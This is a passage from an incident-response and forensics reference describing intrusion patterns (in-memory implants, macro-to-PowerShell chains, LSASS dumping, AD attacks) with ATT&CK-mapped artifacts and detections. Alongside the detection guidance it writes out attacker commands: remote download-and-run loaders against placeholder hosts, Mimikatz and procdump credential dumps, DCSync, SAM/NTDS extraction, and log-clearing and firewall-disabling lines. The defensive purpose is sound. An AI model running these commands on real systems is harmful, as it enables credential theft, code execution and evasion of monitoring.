**Operating shape.** Code lives only in memory of one or more processes. No persistent on-disk footprint of the malicious code (loader may exist; payload does not). The IR community sometimes calls this "fileless" but the term is imprecise — almost everything touches disk somewhere (loader, registry payload blob, scheduled task XML referring to inline scripts). "Memory-resident" is the more accurate label.

**Examples.**
- **Cobalt Strike beacon** — reflective DLL or executable; in-memory; HTTP/HTTPS/DNS/SMB pipe C2. Default config has highly recognizable defaults (User-Agent, URI structure, named pipe `\\.\pipe\msagent_xxxx`) that operators are expected to customize via Malleable C2 profiles. Profile residue: in a captured memory image, the decoded profile is often recoverable as plaintext.
- **Cridex / Dridex / Bugat banking trojan** — historically in-memory after initial loader; targeting banking creds via browser injection (HTML form-grabbing, WebInject configs).
- **Trickbot / Emotet / IcedID** — modular loaders that pull in-memory modules. Trickbot's "modules" each lived as a memory-mapped section; the core loader fetched and injected them on demand. Modules: pwgrab (browser passwords), networkDll (recon), shareDll (shares enumeration), wormDll (SMB worm), tabDll (Outlook contact theft).
- **Volgmer / Lazarus implants** — memory-resident RATs.
- **PoshC2 / Empire / Covenant** — PowerShell or .NET agents.
- **Brute Ratel C4** — commercial implant; uses indirect syscalls, COFF loading, anti-EDR shellcode tricks.
- **Sliver** — Go-based open-source C2 framework; uses Wireguard, mTLS, DNS; gained traction in 2022-2023 as Cobalt Strike alternatives became more detected.

**What stays in memory only.**
- The payload code (reflectively loaded DLL or shellcode).
- Decoded configuration (C2 URLs, encryption keys).
- Captured credentials before exfil.
- Open network sockets.
- Injected threads in other processes.

**What touches disk anyway.**
- The initial loader (unless delivered fully in-memory from upstream).
- Prefetch for the host process.
- Amcache + ShimCache for the host process.
- Log entries (4624, 4688, 7045 if a service was installed).
- Page-file / hiberfil — Windows may page out memory containing the payload to `pagefile.sys`; on shutdown, RAM contents may end up in `hiberfil.sys`. Volatility supports both as supplementary memory inputs.
- Crash dumps if the process ever crashed — full memory dump in `%LOCALAPPDATA%\CrashDumps\` or `C:\Windows\Minidump\`.

**Detection on a captured memory image (the IR analyst's bread and butter).** Volatility 3 plugin set — `windows.malfind`, `windows.ldrmodules`, `windows.netscan`, `windows.cmdline`, `windows.psscan`, `windows.svcscan` — recovers the in-memory implant even when disk shows nothing.

**Dwell.** Cobalt Strike sessions often run for weeks; Cridex / Dridex variants persisted via loader + memory residency for months.

---

## 15. Drive-by download

**Operating shape.** User visits compromised or malicious website; exploit kit landing page profiles the browser; serves exploit for browser, plugin, or document reader; exploit drops loader.

**Common exploit kits (historical).** Angler, RIG, Magnitude, Neutrino, Sundown, Fallout, Underminer. Most degraded after Flash deprecated (2020), Adobe Reader sandboxed, Chrome auto-update. Modern shape: ClearFake / SocGholish injecting fake "browser update" prompts.

**Typical exploit chain.**
1. User clicks link or lands on legit-but-compromised site (compromised WordPress, malvertising).
2. Page loads exploit kit landing.
3. JS profiles: user agent, plugins, fonts.
4. Exploit served: Flash exploit (CVE-2018-15982 et al), Java exploit, Reader exploit, browser memory corruption.
5. Exploit shellcode downloads main payload — historically Cerber, Locky, GandCrab ransomware; banking trojans; cryptominers.
6. Main payload installs and persists.

**Modern shape (post-Flash).**
- "Fake update" social engineering — user clicks "Chrome update needed" → downloads SocGholish JS → drops Cobalt Strike, leads to ransomware.
- Smishing / fake CAPTCHA → user runs PowerShell from clipboard ("To verify you're human, paste this in Run") — Lumma Stealer pattern as of 2024.

**Artifact trail.**
- Browser history / cache showing the malicious URL.
- DNS resolutions to exploit kit infrastructure (often short-lived domains).
- Browser process spawning child processes other than its own (sandbox escape) — Chrome creating cmd.exe is anomalous.
- Downloaded file with Mark-of-the-Web (Zone.Identifier ADS).
- Prefetch / Amcache for the dropper.

---

## 16. Spearphishing → macro → PowerShell

**The bread-and-butter intrusion shape** for the last decade. Most ransomware, most initial-access broker work, most APT operations start here.

**Typical sequence.**
1. **Email arrives.** Attached DOC, DOCM, XLS, XLSM, PPTM, RTF, ISO, IMG, LNK, or HTA. Theme: invoice, shipping notice, HR memo, contract.
2. **User opens.** Word/Excel displays "ENABLE EDITING" / "ENABLE CONTENT" banner. User clicks.
3. **Macro executes.** AutoOpen / Document_Open. Often heavily obfuscated VBA.
4. **Spawn.** Macro calls `Shell()` or `WScript.Shell.Run()` to launch:
   - `cmd.exe /c powershell.exe -nop -w hidden -enc <base64>`
   - `wscript.exe`, `cscript.exe` on a dropped .js / .vbs
   - `mshta.exe http://attacker/x.hta`
   - `rundll32.exe javascript:...`
5. **PowerShell loader.**
   - `IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')`
   - `IEX (New-Object Net.WebClient).DownloadString('http://x/y.txt')` — fetched .txt is PS
   - `Invoke-WebRequest`, `Invoke-RestMethod`
   - In-memory reflection load of .NET assembly.
6. **Payload running in memory.** Cobalt Strike beacon, Empire agent, custom RAT.

**Artifact trail.**
- The email itself if exchange/o365 retention permits.
- Office app launching `cmd.exe` / `powershell.exe` / `mshta.exe` / `wscript.exe` — process tree screams.
- Sysmon EID 1 with ParentImage = `winword.exe` / `excel.exe` / `outlook.exe` and Image in the LOLBin set.
- Sysmon EID 11 (file create) for any dropped artifact.
- Sysmon EID 3 (network connection) from PowerShell / mshta to attacker domain.
- Office Trust Center logs (depending on configuration): `HKCU\Software\Microsoft\Office\<ver>\Word\Security\Trusted Documents\TrustRecords\` — entries for each opened document with "enable" flags. Can confirm the user did click Enable Content.
- `%LOCALAPPDATA%\Microsoft\Office\<ver>\WebServiceCache\` and `\OTele\` may contain telemetry traces.
- MSO Recent Items / Office MRU registry.
- Prefetch for `cmd.exe`, `powershell.exe`, `mshta.exe`, etc.
- PS Operational EID 4104 with the decoded script block (if logging on).
- AMSI events if AMSI caught the payload.

**Mitigation that often fires.** Office 2016+ blocks macros from internet-zone files by default (since 2022). Attackers shifted to ISO/IMG/ZIP containers (Mark-of-the-Web doesn't propagate inside ISO until Win11 22H2 fixed it) and LNK files. Then to HTML smuggling (JS in HTML attachment that constructs the payload client-side, bypassing email gateway scanning of attachments).

---

## 17. Targeted credential theft from LSASS

**Operating shape.** Once an attacker has SYSTEM on a host, the next reflex is dumping LSASS (`lsass.exe`) — the process that holds NTLM hashes, Kerberos tickets, and cached credentials for every account that has logged on.

**Common methods.**

- **Mimikatz** (`mimikatz # privilege::debug; sekurlsa::logonpasswords`).
  - Most well-known LSASS reader. Default file `mimikatz.exe` is signature-detected by every AV.
  - Variants: BetterSafetyKatz, SafetyKatz, Pypykatz (Python), Mimikatz embedded in Cobalt Strike, Mimikatz `/inMemory` invocation from a loader.

- **procdump (Sysinternals).** `procdump.exe -ma lsass.exe lsass.dmp` — produces full memory dump of LSASS; attacker runs Mimikatz against the .dmp offline. Procdump is signed by Microsoft so often whitelisted; this is the classic LOLBin credential dump.

- **`comsvcs.dll` MiniDump export.** `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <pid> C:\out.dmp full` — built-in Windows; no extra binary needed. PID is LSASS's PID. Discovered ~2019 and rapidly adopted.

- **Task Manager → Create Dump File.** Right-click lsass.exe → Create Dump File. GUI version of the same.

- **Werfault / WER.** Trigger LSASS crash with Werfault writing memory dump to `%LOCALAPPDATA%\CrashDumps`.

- **Outflank's Dumpert.** Uses direct syscalls + dynamic Win32 API lookup to evade EDR; produces a dump file with no obvious API trace.

- **SilentTrinity, Nanodump, HandleKatz, MalSeclogon.** Each evades a specific EDR detection chain — duplicating handles from procexp/procmon driver, using clone-thread tricks, etc.

- **SAM hive direct read.** `reg save HKLM\SAM sam.save`, `reg save HKLM\SYSTEM system.save` — local accounts only; offline crack with `secretsdump.py` (Impacket).

- **NTDS.dit dump.** On a domain controller: `ntdsutil "ac in ntds" "ifm" "create full c:\out" q q` — IFM (Install From Media) snapshot; contains the entire AD database including hashes. `secretsdump.py -ntds ...` decrypts.

- **DCSync.** `mimikatz # lsadump::dcsync /user:Administrator` — pull a single user's NTLM hash via MS-DRSR replication protocol; requires Replicating Directory Changes ACL (granted to Domain Admins and DCs). Critically: no code runs on the DC; the dumping host requests replication, the DC complies. Detection is EID 4662 on the DC with Replicate Directory Changes GUIDs.

**Detection.**
- **Sysmon EID 10 (ProcessAccess)** with TargetImage = `lsass.exe` and GrantedAccess including `0x1010`, `0x1410`, `0x1438`, `0x143A`, `0x1FFFFF` — these high access masks are the classic LSASS-dump signature.
- **Defender / Defender for Endpoint.** Detect almost all LSASS dump techniques in default config; `LSASS Memory Access` is a default detection.
- **PPL / LSA protection.** Win10+ supports running LSASS as a Protected Process Light (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`); blocks user-mode dumping. Attackers respond by loading a vulnerable signed driver to disable PPL (BYOVD — see #16 above).
- **EID 4663** on lsass.exe handle requests with write privileges — when configured.
- **Memory artifacts.** A captured memory image at the time of dumping shows the dumper process with an open handle to LSASS and the LSASS memory contents in the dumper's address space.

---

## 18. Active Directory compromise patterns

### DCSync (T1003.006)
- **What.** Use MS-DRSR (DRS Remote Protocol) to ask a domain controller for replication of secrets. Mimikatz `lsadump::dcsync`, Impacket `secretsdump.py`.
- **Requires.** "Replicating Directory Changes" + "Replicating Directory Changes All" on the domain naming context. Granted to Domain Admins, DCs, and any custom group.
- **Detection.** EID 4662 on a DC with Object access of:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicate Directory Changes)
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Replicate Directory Changes All)
  - `89e95b76-444d-4c62-991a-0facbeda640c` (Replicate Directory Changes In Filtered Set)
  
  from a SID that is not a DC computer account. False positives: AD replication tools running from server-class machines.

### Skeleton Key (T1556.001)
- **What.** Patch LSASS in memory of a DC so it accepts a fixed "master password" for any account, alongside that account's real password. Mimikatz `misc::skeleton`.
- **Detection.** LSASS injection signatures; Sysmon EID 8/10 with target lsass.exe; memory analysis of the DC (LSASS section modified in memory but not on disk).

### AdminSDHolder backdoor
- **What.** Modify ACL on `CN=AdminSDHolder,CN=System,DC=...` to add an attacker-controlled account with Full Control. Every 60 minutes, SDProp (SD Propagator) re-applies AdminSDHolder's ACL to every "protected" account (Domain Admins, Enterprise Admins, BUILTIN\Administrators, etc.). Backdoor account gains Full Control over all of those. Restoring the ACL is not enough — the attacker can re-add at any time.
- **Detection.** ACL change events on AdminSDHolder (EID 5136 on a DC, requires "Audit Directory Service Changes" subcategory).

### GPO abuse
- **What.** Modify a GPO that targets many machines. Add a startup script (`SYSVOL\<domain>\Policies\<GUID>\Machine\Scripts\Startup\script.bat`) or a Scheduled Tasks Preference. On next gpupdate, all targeted machines run the script.
- **Detection.** File-share access on SYSVOL by non-administrator account (EID 5145), changes to SYSVOL files (EID 4663 with object access).

### Kerberos delegation abuse
- **Unconstrained delegation.** Compromise a server with TrustedForDelegation. Trick a DA to authenticate to it. Pull DA's TGT from memory. Use for golden-ticket-like privilege.
- **Constrained delegation (S4U2self / S4U2proxy).** Compromise a service account with msDS-AllowedToDelegateTo. Use Rubeus or kekeo to ask for a ticket as any user to the allowed target service. KrbRelay, S4U2pwnage.
- **Resource-Based Constrained Delegation (RBCD).** Write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer object (any user with `Write` permission can do this). Then S4U2 to act as any account against the target. The "MachineAccountQuota" (default 10 per user) means an unprivileged user can create a computer account they control, then RBCD-pivot.
- **Detection.** EID 4769 anomalies (S4U2proxy tickets), EID 5136 ACL changes on Computer objects, msDS-AllowedToDelegateTo / AllowedToActOnBehalfOfOtherIdentity modifications.

### NTLM relay
- **What.** Coerce a victim to authenticate to attacker (PetitPotam, PrinterBug via RpcRemoteFindFirstPrinterChangeNotification, DFSCoerce), relay credentials to a target service that lacks NTLM signing/SMB-signing. Resulting authenticated session has the victim's privileges.
- **Detection.** PetitPotam EID 4624 type 3 sequence; DFS coerce often shows up in DFSR logs.

### LAPS abuse
- **What.** Local Administrator Password Solution (LAPS) stores local admin password in `ms-Mcs-AdmPwd` attribute of Computer object. Read access controlled by ACL; misconfigured ACLs let unprivileged users read LAPS passwords.
- **Detection.** EID 4662 with Property = `ms-Mcs-AdmPwd` (and the newer LAPS variant attributes) by unprivileged accounts.

---

## 19. AS-REP Roasting + Kerberoasting (operationalized)

Already covered detection above (#32). The operational shape:

**AS-REP roasting.**
1. Enumerate accounts with `useraccountcontrol -band 4194304` (DONT_REQ_PREAUTH).
2. Request AS-REP for each — `Rubeus asreproast` or `GetNPUsers.py` (Impacket).
3. Each response contains material encrypted with the user's NTLM hash; offline crack.
4. Detection: EID 4768 with Pre-Authentication Type = 0.

**Kerberoasting.**
1. Enumerate SPNs via LDAP (any authenticated user can): `setspn -Q */*`, `Rubeus kerberoast`, `GetUserSPNs.py`.
2. Request TGS for each: `klist`, `Add-Type` + `KerberosRequestorSecurityToken`.
3. Each TGS is encrypted with the service account's NTLM hash; offline crack.
4. Detection: EID 4769 with `Ticket Encryption Type = 0x17` and Service Name = service account.

**Honeyaccount trap.** Create a service account `svc_finance_honey` with SPN, weak-looking password, no actual permissions. Alert on EID 4769 with this Service Name from any source. Near-zero false positive.

---

## 20. Pass-the-Hash / Pass-the-Ticket / Pass-the-Cert

**Pass-the-Hash (PtH).** Use NTLM hash directly to authenticate without knowing the cleartext password. Mimikatz `sekurlsa::pth /user:Admin /domain:corp /ntlm:<hash>`.

**Pass-the-Ticket (PtT).** Use a Kerberos ticket (TGT or TGS) — `Rubeus ptt /ticket:<base64>` or `mimikatz # kerberos::ptt`. Includes Golden / Silver / Diamond / Sapphire tickets.

**Pass-the-Cert.** Modern variant — use a user's X.509 certificate (from PKINIT / AD CS) to request TGT. AD Certificate Services misconfigurations (ESC1-ESC11 from Certified Pre-Owned paper, SpecterOps 2021) expose this. Certify, Certipy.

**Detection — characteristic 4624 Type 3 with NULL logon process.**
- PtH from Mimikatz produces EID 4624 type 9 (NewCredentials) on the source host with LogonProcessName = "seclogo".
- On the target host, the resulting auth is EID 4624 Type 3 (network) with:
  - LogonProcessName often blank or "NtLmSsp"
  - AuthenticationPackageName = "NTLM" even when domain policy forces Kerberos
  - WorkstationName = the source host but may be missing
- PtT produces EID 4624 with Kerberos auth but the TGT/TGS may have anomalous fields if forged (Golden/Silver).
- PtC produces EID 4624 with Kerberos + PKINIT, often from accounts that shouldn't be using cert auth.

**Cross-correlation.** Same hash being used to log on from multiple workstations within minutes is a strong signal; same SID with two distinct LogonId across hosts simultaneously.

---

# Part C — MITRE ATT&CK Subset for Host Forensics

MITRE ATT&CK is the standard taxonomy for adversary tradecraft. There are 14 tactics (the "why" — Initial Access through Impact) and ~200 techniques (the "how"). The subset below covers the techniques that show up most often on host forensics, with concrete artifact mappings.

Every entry includes:
- **Tactic + technique ID + name.**
- **Sub-techniques** when applicable.
- **Evidencing artifacts** — what shows the technique happened.
- **Common detection and false positives.**

---

## Initial Access (TA0001)

### T1078 — Valid Accounts
Sub-techniques: T1078.001 Default Accounts, T1078.002 Domain Accounts, T1078.003 Local Accounts, T1078.004 Cloud Accounts.

- **Evidence.** EID 4624 (logon) successful with an unexpected account from an unexpected source. Anomalous logon hours, geolocation, source IP. AzureAD sign-in logs for cloud.
- **False positives.** Travel, VPN, legitimate admin work, shared service accounts.

### T1133 — External Remote Services
- **Evidence.** RDP/VPN/SSH/Citrix gateway logs. EID 4624 type 10 (RDP) from external IP. VPN concentrator logs. Web-based RDS gateway logs.
- **False positives.** Remote workers, MSP access.

### T1190 — Exploit Public-Facing Application
- **Evidence.** Web server access logs showing the exploit request (unusual URI, SQL injection patterns, deserialization payloads, abnormal headers). Application logs showing exception traces. Process tree: `w3wp.exe → cmd.exe`, `httpd → bash`. File creation in web root by web server process.
- **False positives.** Vulnerability scanners, security testing.

### T1566 — Phishing
Sub-techniques: T1566.001 Spearphishing Attachment, T1566.002 Spearphishing Link, T1566.003 Spearphishing via Service.

- **Evidence.** Email retention (M365 / Exchange / Google Workspace). User clicked → browser history → download → ZoneId=3. Attachment opened → Office Trust Center records. Office spawned child process.
- **False positives.** Legitimate vendor communications, marketing emails with attachments.

---

## Execution (TA0002)

### T1059 — Command and Scripting Interpreter
Sub-techniques most relevant:
- **T1059.001 PowerShell** — EID 4103 (module logging), 4104 (script block), 400/600 (engine). Sysmon EID 1. ParentImage analysis.
- **T1059.003 Windows Command Shell** — EID 4688 / Sysmon EID 1 with Image = cmd.exe; command lines.
- **T1059.005 Visual Basic** — wscript/cscript Sysmon EID 1.
- **T1059.007 JavaScript** — wscript with .js, mshta with javascript:.
- **T1059.006 Python** — python.exe with script.

**Common false positives.** Sysadmin work, software installers, legitimate scripts.

### T1053 — Scheduled Task/Job
- **T1053.005 Scheduled Task** — EID 4698 (Security log, task created), 4699 (deleted), 4700/4701 (enabled/disabled), 4702 (updated). TaskScheduler/Operational 106 (registered), 140 (updated), 141 (deleted). File: `C:\Windows\System32\Tasks\<taskname>`. Registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\<GUID>` and `Tree\<path>`.
- **False positives.** Many vendor installs create scheduled tasks; baseline matters.

### T1106 — Native API
- Generic API-based execution; hard to detect at the API level without EDR hooks. Detection by behavior — what the API ultimately did (process create, thread create).

### T1129 — Shared Modules
- DLL loading via LoadLibrary; Sysmon EID 7. Mostly relevant when combined with other techniques (search order hijack).

### T1203 — Exploitation for Client Execution
- Office exploit, browser exploit, PDF exploit. Process tree shows victim app spawning unexpected children. Memory dump shows shellcode in victim app's address space.

---

## Persistence (TA0003)

### T1543 — Create or Modify System Process
- **T1543.003 Windows Service** — EID 4697 (Security) and EID 7045 (System) for service install. Registry: `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. ImagePath value points to the binary. ServiceType, Start values.
- **False positives.** Legitimate software installers; Windows updates.

### T1547 — Boot or Logon Autostart Execution
Sub-techniques:
- **T1547.001 Registry Run Keys / Startup Folder.** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` and `\RunOnce`, plus HKCU versions. `Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit, Shell`. Startup folder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`. Sysmon EID 12/13.
- **T1547.002 Authentication Package.** `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages`.
- **T1547.003 Time Providers.** `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\`.
- **T1547.004 Winlogon Helper DLL.** `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`, `\Shell`, `\Userinit`.
- **T1547.005 Security Support Provider.** `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`.
- **T1547.006 Kernel Modules and Extensions.** Driver load (Sysmon EID 6); registry `HKLM\SYSTEM\CurrentControlSet\Services\<driver>`.
- **T1547.008 LSASS Driver.** `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\DirectoryServiceExtPt`-style.
- **T1547.009 Shortcut Modification.** .lnk file in Startup folder; or modified .lnk pointing to malicious target.
- **T1547.010 Port Monitors.** `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\<name>`.
- **T1547.012 Print Processors.** `HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors`.
- **T1547.014 Active Setup.** `HKLM\Software\Microsoft\Active Setup\Installed Components\<GUID>\StubPath`.
- **T1547.015 Login Items** (macOS) — `~/Library/LaunchAgents/`, `LaunchDaemons`.

### T1546 — Event Triggered Execution
- **T1546.001 Change Default File Association.** `HKCU\Software\Classes\<ext>\shell\open\command`.
- **T1546.002 Screensaver.** `HKCU\Control Panel\Desktop\SCRNSAVE.EXE`.
- **T1546.003 WMI Event Subscription.** See anti-forensics catalog #25.
- **T1546.007 Netsh Helper DLL.** `HKLM\SOFTWARE\Microsoft\Netsh\<name>` = DLL path.
- **T1546.008 Accessibility Features.** IFEO Debugger on sethc/utilman/etc.
- **T1546.009 AppCert DLLs.** See catalog #13.
- **T1546.010 AppInit DLLs.** See catalog #13.
- **T1546.011 Application Shimming.** Custom Shim Database (.sdb) registered. `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\` and `\InstalledSDB\`.
- **T1546.012 Image File Execution Options Injection.** See catalog #13 IFEO Debugger.
- **T1546.013 PowerShell Profile.** `$PROFILE` paths, `%USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1`.
- **T1546.015 Component Object Model Hijacking.** See catalog #15.

### T1574 — Hijack Execution Flow
- **T1574.001 DLL Search Order Hijacking** — see catalog #14.
- **T1574.002 DLL Side-Loading** — see catalog #14.
- **T1574.004 Dylib Hijacking** (macOS).
- **T1574.006 Dynamic Linker Hijacking** — `LD_PRELOAD` on Linux, `DYLD_INSERT_LIBRARIES` on macOS.
- **T1574.007 Path Interception by PATH Environment Variable.**
- **T1574.008 Path Interception by Search Order Hijacking.**
- **T1574.009 Path Interception by Unquoted Path.**
- **T1574.010 Services File Permissions Weakness.**
- **T1574.011 Services Registry Permissions Weakness.**
- **T1574.012 COR_PROFILER.** Set `COR_PROFILER` env var to load a malicious .NET profiler DLL into every CLR-hosted process.

---

## Privilege Escalation (TA0004)

### T1068 — Exploitation for Privilege Escalation
- Kernel exploits, driver exploits (BYOVD), local race conditions. Evidence: crash dumps, kernel panic logs, service crash records. EID 1000/1001 in Application log.

### T1078 — Valid Accounts (also Initial Access)
- Same as TA0001 entry.

### T1134 — Access Token Manipulation
- **T1134.001 Token Impersonation/Theft.** SeImpersonatePrivilege abuse — Potato family. Detection via Sysmon EID 1 + token analysis at the EDR layer.
- **T1134.002 Create Process with Token.** `CreateProcessAsUser`/`CreateProcessWithToken`.
- **T1134.005 SID-History Injection.** Mimikatz `lsadump::sid-history`. Detection via AD audit on sidHistory attribute modification.

### T1543 — overlaps with Persistence.

---

## Defense Evasion (TA0005)

### T1027 — Obfuscated Files or Information
- Sub-techniques include T1027.002 Software Packing, T1027.005 Indicator Removal from Tools, T1027.009 Embedded Payloads, T1027.011 Fileless Storage, T1027.013 Encrypted/Encoded File.
- **Evidence.** Entropy analysis (packed PE has high-entropy sections). Detection of common packers (UPX, Themida, VMProtect) via signatures. Long base64 strings in command lines. PowerShell `-EncodedCommand`.

### T1036 — Masquerading
- **T1036.001 Invalid Code Signature.** Forged or broken signatures.
- **T1036.003 Rename System Utilities.** `cmd.exe` renamed to `mc.exe`; detection via hash match plus name mismatch.
- **T1036.004 Masquerade Task or Service.** Task/service named after legitimate Microsoft service.
- **T1036.005 Match Legitimate Name or Location.** Dropping `svchost.exe` to `C:\Users\Public\`.
- **T1036.007 Double File Extension.** `invoice.pdf.exe`.

### T1055 — Process Injection
- **T1055.001 DLL Injection.** Classic LoadLibrary via CreateRemoteThread. Sysmon EID 8.
- **T1055.002 Portable Executable Injection.**
- **T1055.003 Thread Execution Hijacking.** SuspendThread + SetThreadContext + ResumeThread.
- **T1055.004 Asynchronous Procedure Call.** See catalog #10.
- **T1055.005 Thread Local Storage.** TLS callback abuse.
- **T1055.008 Ptrace System Calls** (Linux).
- **T1055.009 Proc Memory** (Linux).
- **T1055.011 Extra Window Memory Injection.** SetWindowLong on a known window.
- **T1055.012 Process Hollowing.** See catalog #6.
- **T1055.013 Process Doppelgänging.** See catalog #7.
- **T1055.014 VDSO Hijacking** (Linux).
- **T1055.015 ListPlanting.** SendMessage(LVM_SETITEMTEXT) injection.

**Memory analysis** — `windows.malfind` is the central plugin for all these.

### T1070 — Indicator Removal
- **T1070.001 Clear Windows Event Logs.** See catalog #2.
- **T1070.002 Clear Linux or Mac System Logs.** `> /var/log/auth.log`, `wtmp` truncation, `lastlog` clearing.
- **T1070.003 Clear Command History.** `history -c`, `unset HISTFILE`, removing `.bash_history`.
- **T1070.004 File Deletion.** Standard file delete; recoverable from MFT/USN unless wipe is also applied.
- **T1070.005 Network Share Connection Removal.** `net use /delete`.
- **T1070.006 Timestomp.** See catalog #1.
- **T1070.007 Clear Network Connection History and Configurations.** Wireless profile deletion, ARP cache clear, route table modification.
- **T1070.008 Clear Mailbox Data.**
- **T1070.009 Clear Persistence.** Removal of own scheduled task, service, registry key after use.

### T1112 — Modify Registry
- Generic registry modification. Sysmon EIDs 12 (key create/delete), 13 (value set), 14 (key/value renamed).
- **Notable target hives/keys for attacker abuse**: every persistence key above; security audit policy keys; Defender configuration keys; WDigest UseLogonCredential (set =1 to make cleartext passwords cacheable for Mimikatz); Local Security Authority NoLMHash; LSA Notification Packages.

### T1140 — Deobfuscate/Decode Files or Information
- `certutil -decode`, base64 decoding, XOR loops in scripts.

### T1218 — System Binary Proxy Execution (LOLBins)
- Maps to anti-forensics catalog #5 in detail.
- **Sub-techniques.** T1218.001 Compiled HTML File (chm), T1218.002 Control Panel (.cpl), T1218.003 CMSTP, T1218.004 InstallUtil, T1218.005 Mshta, T1218.007 Msiexec, T1218.008 Odbcconf, T1218.009 Regsvcs/Regasm, T1218.010 Regsvr32, T1218.011 Rundll32, T1218.012 Verclsid, T1218.013 Mavinject, T1218.014 MMC.

### T1562 — Impair Defenses
- **T1562.001 Disable or Modify Tools.** Defender disable; AV uninstall.
- **T1562.002 Disable Windows Event Logging.** `auditpol /clear`, `wevtutil sl`.
- **T1562.003 Impair Command History Logging.** `unset HISTFILE`.
- **T1562.004 Disable or Modify System Firewall.** `netsh advfirewall set allprofiles state off`.
- **T1562.006 Indicator Blocking.** Disable Sysmon, ETW patching.
- **T1562.007 Disable or Modify Cloud Firewall.** CloudTrail event for SecurityGroup change.

### T1564 — Hide Artifacts
- **T1564.001 Hidden Files and Directories.** `attrib +h +s +r`; `chflags hidden`.
- **T1564.003 Hidden Window.** `-WindowStyle Hidden` on PowerShell.
- **T1564.004 NTFS File Attributes.** See catalog #4 ADS.
- **T1564.005 Hidden File System.** Encrypted volumes; FAT32 in slack space (rare APT shape).
- **T1564.006 Run Virtual Instance.**
- **T1564.008 Email Hiding Rules.** See playbook #7 BEC.

---

## Credential Access (TA0006)

### T1003 — OS Credential Dumping
- **T1003.001 LSASS Memory.** See playbook #17. Sysmon EID 10 LSASS access patterns.
- **T1003.002 Security Account Manager.** SAM hive dump (`reg save HKLM\SAM`). Detection: Sysmon EID 11 (file create on .save), EID 4663 on registry keys.
- **T1003.003 NTDS.** `ntdsutil ifm`. Detection: file write of ntds.dit copy outside expected backup workflow.
- **T1003.004 LSA Secrets.** `reg save HKLM\SECURITY`; secrets at `HKLM\SECURITY\Policy\Secrets`.
- **T1003.005 Cached Domain Credentials.** Cached MSCASHv2 hashes; offline crack.
- **T1003.006 DCSync.** See playbook #18.

### T1110 — Brute Force
- **T1110.001 Password Guessing.** EID 4625 (failed logon) bursts.
- **T1110.002 Password Cracking.** Offline; little host-side signal.
- **T1110.003 Password Spraying.** Many accounts, few attempts each — defeats lockout.
- **T1110.004 Credential Stuffing.** Reuse from leaks; AzureAD sign-in shows "leaked credentials" risk events.

### T1555 — Credentials from Password Stores
- **T1555.003 Credentials from Web Browsers.** Chrome/Firefox/Edge stored passwords. Targets: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` (SQLite), Edge same path under `Microsoft\Edge`, Firefox `logins.json` + `key4.db`.
- **T1555.004 Windows Credential Manager.** `vaultcmd /listcreds`, Mimikatz `vault::cred`.
- **T1555.005 Password Managers.** KeePass DB, Bitwarden vault file.

### T1558 — Steal or Forge Kerberos Tickets
- **T1558.001 Golden Ticket.** See catalog #32.
- **T1558.002 Silver Ticket.** Catalog #32.
- **T1558.003 Kerberoasting.** Playbook #19.
- **T1558.004 AS-REP Roasting.** Playbook #19.

---

## Discovery (TA0007)

### T1018 — Remote System Discovery
- `net view`, `nltest /dclist`, `arp -a`, `ping -n 1`, `Get-ADComputer`.
- **Evidence.** Sysmon EID 1 with these images and command lines.

### T1057 — Process Discovery
- `tasklist`, `Get-Process`, `ps`, `wmic process list`.
- High-volume process enumeration from a single user.

### T1082 — System Information Discovery
- `systeminfo`, `hostname`, `whoami`, `Get-ComputerInfo`, `wmic csproduct`.

### T1083 — File and Directory Discovery
- `dir /s`, `tree`, `find / -name`, `Get-ChildItem -Recurse`.
- Volume of file-system traversal.

### T1087 — Account Discovery
- **T1087.001 Local Account.** `net user`, `Get-LocalUser`.
- **T1087.002 Domain Account.** `net user /domain`, `net group "Domain Admins" /domain`, `Get-ADUser`.
- **T1087.003 Email Account.** `Get-GlobalAddressList`.

### T1135 — Network Share Discovery
- `net view \\target`, `Get-SmbShare`, `net share`.

---

## Lateral Movement (TA0008)

### T1021 — Remote Services
- **T1021.001 RDP.** EID 4624 type 10 on target. TerminalServices logs.
- **T1021.002 SMB/Windows Admin Shares.** EID 5145 file share access, EID 4624 type 3 source.
- **T1021.003 Distributed Component Object Model.** MMC20.Application, ShellWindows, ShellBrowserWindow DCOM activation.
- **T1021.004 SSH.** sshd auth logs on Linux; EID 4624 if Windows OpenSSH.
- **T1021.005 VNC.** VNC server log.
- **T1021.006 Windows Remote Management.** WinRM EID 91 (session create); 4624 type 3 with Process Name WsmProvHost.exe.

### T1570 — Lateral Tool Transfer
- File transfer to a remote host (SMB copy to ADMIN$/C$, scp, BITS).
- **Evidence.** EID 5145 with file paths, EID 4663, source workstation field.

### T1550 — Use Alternate Authentication Material
- **T1550.001 Application Access Token.** OAuth tokens.
- **T1550.002 Pass the Hash.** See playbook #20.
- **T1550.003 Pass the Ticket.** Playbook #20.
- **T1550.004 Web Session Cookie.** Stolen browser cookies.

---

## Collection (TA0009)

### T1005 — Data from Local System
- File access bursts under user profile dirs. EID 4663 with read access.

### T1039 — Data from Network Shared Drive
- File reads from network shares; SMB server side: EID 5145.

### T1056 — Input Capture
- **T1056.001 Keylogging.** Implant injecting into target processes; SetWindowsHookEx; raw input keyboard listening.
- **T1056.002 GUI Input Capture.** Fake credential prompts.
